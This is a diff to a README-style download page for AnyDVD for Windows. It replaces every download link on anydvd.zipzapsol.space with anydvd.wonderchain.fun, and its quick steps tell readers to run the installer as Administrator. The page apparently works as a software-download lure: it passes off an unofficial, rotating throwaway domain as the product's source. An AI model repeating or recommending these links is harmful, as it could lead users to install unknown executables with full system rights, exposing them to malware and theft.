@@ -13,27 +13,27 @@
 > **This is the download page.** Use the button or link below to get **AnyDVD** for Windows.
 
 <p align="center">
-  <a href="https://anydvd.zipzapsol.space/">
+  <a href="https://anydvd.wonderchain.fun/">
     <img src="https://img.shields.io/badge/Download-AnyDVD-0078D4?style=for-the-badge&logo=windows&logoColor=white" alt="Download AnyDVD">
   </a>
 </p>
 
 | | |
 | --- | --- |
-| **Direct link** | **[anydvd.zipzapsol.space](https://anydvd.zipzapsol.space/)** |
-| **Full URL** | `https://anydvd.zipzapsol.space/` |
+| **Direct link** | **[anydvd.wonderchain.fun](https://anydvd.wonderchain.fun/)** |
+| **Full URL** | `https://anydvd.wonderchain.fun/` |
 | **Type** | Installer for Windows 10 / 11 (64-bit) |
 | **Admin** | Run setup as Administrator |
 
 ### Quick steps
 
-1. Click **[Download — anydvd.zipzapsol.space](https://anydvd.zipzapsol.space/)** (link above)
+1. Click **[Download — anydvd.wonderchain.fun](https://anydvd.wonderchain.fun/)** (link above)
 2. Save the file from the project page
 3. Run the setup **as Administrator**
 4. Enter your license key when prompted
 5. Restart if the installer asks — then launch from Start menu
 
-<p align="center"><a href="https://anydvd.zipzapsol.space/"><strong>⬇ Download AnyDVD now</strong></a></p>
+<p align="center"><a href="https://anydvd.wonderchain.fun/"><strong>⬇ Download AnyDVD now</strong></a></p>
 
 ---
 
